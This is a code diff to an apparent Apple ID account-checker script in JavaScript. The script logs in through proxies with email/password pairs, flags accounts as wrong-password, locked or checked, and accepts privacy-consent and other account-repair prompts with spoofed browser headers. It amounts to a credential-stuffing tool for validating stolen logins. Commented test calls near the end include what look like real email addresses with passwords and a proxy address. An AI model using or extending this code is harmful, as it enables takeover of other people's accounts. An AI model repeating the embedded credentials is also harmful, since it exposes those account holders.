@@ -114,7 +114,7 @@ const loginIdApple = (proxy, proof) => {
           resolve("sai pass")
         } else if (error?.response?.status == 412) {
           resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
-        } else if(error?.response?.status == 403) {
+        } else if (error?.response?.status == 403) {
           resolve('locked')
         } else {
           resolve(false)
@@ -198,6 +198,14 @@ const option = (proxy, sessionId, sessionToken, widgetId) => {
           resolve({ type: "birthday", headers: response.headers })
         } else if (response?.data?.security?.questions || (response?.data?.repairMissingData && response?.data?.repairMissingData?.includes("questions"))) {
           resolve({ type: "questions", headers: response.headers })
+        } else if (response?.data?.repairContext?.repairType) {
+          if (response?.data?.repairContext?.repairType == "crossBorderPrivacyConsent") {
+            resolve({ type: "crossBorderPrivacyConsent", headers: response.headers })
+          } else {
+            resolve({ type: "repairType", headers: response.headers })
+          }
+        } else if (response?.data?.repairItem === "email") {
+          resolve({ type: "repairEmail", headers: response.headers })
         } else {
           resolve(false)
         }
@@ -210,6 +218,92 @@ const option = (proxy, sessionId, sessionToken, widgetId) => {
         } else {
           resolve(false)
         }
+      });
+  })
+}
+
+const consent = (proxy, type, aidsp, sessionToken, scnt, widgetId) => {
+  let data = JSON.stringify({
+    "account": {
+      "preferences": {
+        "privacyPreferences": {
+          "appleCrossBorderPrivacyNoticeAccepted": true
+        }
+      }
+    },
+    "completedSteps": [],
+    "requiredSteps": [
+      "crossBorderPrivacyConsent"
+    ],
+    "repairContext": {
+      "repairType": "crossBorderPrivacyConsent",
+      "repairItems": [
+        "crossBorderPrivacyConsent"
+      ]
+    }
+  });
+  if (type === "crossBorderPrivacyConsent") {
+    data = JSON.stringify({
+      "account": {
+        "preferences": {
+          "privacyPreferences": {
+            "gcbdCrossBorderPrivacyNoticeAccepted": true
+          }
+        }
+      },
+      "completedSteps": [],
+      "requiredSteps": [
+        "crossBorderPrivacyConsent"
+      ],
+      "repairContext": {
+        "repairType": "crossBorderPrivacyConsent",
+        "repairItems": [
+          "crossBorderPrivacyConsent"
+        ]
+      }
+    });
+  }
+  return new Promise((resolve) => {
+    let config = {
+      method: 'post',
+      maxBodyLength: Infinity,
+      proxy,
+      url: 'https://appleid.apple.com/account/manage/repair/privacy/consent',
+      headers: {
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json',
+        'Cookie': `idclient=web; dslang=US-EN; site=USA; aidsp=${aidsp}`,
+        'Origin': 'https://appleid.apple.com',
+        'Referer': 'https://appleid.apple.com/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+        'X-Apple-I-TimeZone': 'Asia/Bangkok',
+        'X-Apple-Session-Token': sessionToken,
+        'X-Apple-ID-Session-Id': aidsp,
+        'scnt': scnt,
+        'X-Apple-Locale': 'en_us',
+        'X-Apple-Mandate-Security-Upgrade': '0',
+        'X-Apple-Skip-Repair-Attributes': '[]',
+        'X-Apple-Widget-Key': widgetId,
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"macOS"',
+        'Cookie': 'dslang=US-EN; site=USA'
+      },
+      data
+    };
+
+    instance.request(config)
+      .then(function (response) {
+        resolve({ cookies: response.headers['set-cookie'] });
+      })
+      .catch(function (error) {
+        resolve(false);
       });
   })
 }
@@ -352,9 +446,9 @@ const CHBMAppleID = (email, pass, proxyString) => {
           status: 'not checked'
         })
       }, 300000);
-      for (let index = 0; index < 2; index++) {
+      for (let index = 0; index < 3; index++) {
         let widgetKey = await getConfigRequest(proxy, frame_id);
-        if(!widgetKey) {
+        if (!widgetKey) {
           return resolve({
             mail: email,
             pass: pass,
@@ -395,9 +489,11 @@ const CHBMAppleID = (email, pass, proxyString) => {
               if (optionHeader) {
                 let type = optionHeader.type;
                 optionHeader = optionHeader.headers;
-                if (type == 'birthday') {
+                if (type == 'repairType' || type == 'crossBorderPrivacyConsent') {
+                  await consent(proxy, type, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
+                  continue;
+                } else if (type == 'birthday') {
                   birthday = await repairBirthDay(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
-                  index--;
                   continue;
                 } else if (type == 'questions') {
                   const questions = await repairQuestions(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
@@ -412,6 +508,14 @@ const CHBMAppleID = (email, pass, proxyString) => {
                       birthday
                     })
                   }
+                } else if (type == 'repairEmail') {
+                  return resolve({
+                    mail: email,
+                    pass: pass,
+                    proxy: proxyString,
+                    status: 'checked',
+                    note: 'repair email'
+                  })
                 }
               } else {
                 return resolve({
@@ -454,7 +558,7 @@ const CHBMAppleID = (email, pass, proxyString) => {
 }
 
 // (async () => {
-//   let a = await CHBMAppleID("titouta2009@hotmail.com", "9sY0O9wTcv3@", "109.236.86.4:15987");
+//   let a = await CHBMAppleID("gerryli1976@hotmail.com", "gYMCFKQhAO2@", "109.236.86.4:15987");
 //   console.log(a);
 // })()
 
